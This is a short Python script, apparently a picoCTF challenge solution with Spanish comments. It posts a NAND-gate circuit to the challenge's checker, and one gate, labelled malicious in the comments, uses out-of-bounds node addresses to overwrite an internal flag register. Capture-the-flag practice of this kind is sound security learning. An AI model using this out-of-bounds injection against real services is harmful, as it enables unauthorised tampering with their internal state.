import requests

# Lógica válida: NOT(A) = NAND(A,A). Esto evita el error 0x3333.
# Los nodos 5, 6, 7, 8 son entradas; 1, 2, 3, 4 son salidas.
circuit = [
    {"input1": 5, "input2": 5, "output": 1},
    {"input1": 6, "input2": 6, "output": 2},
    {"input1": 7, "input2": 7, "output": 3},
    {"input1": 8, "input2": 8, "output": 4},
    # Puerta maliciosa: inyecta 255 en el nodo que controla el flag (señal interna)
    # Direccionamiento OOB para alcanzar el registro de flags
    {"input1": 65535, "input2": 65535, "output": 61440} 
]

url = "http://activist-birds.picoctf.net:57005/check"
response = requests.post(url, json={"circuit": circuit})

print(response.json())
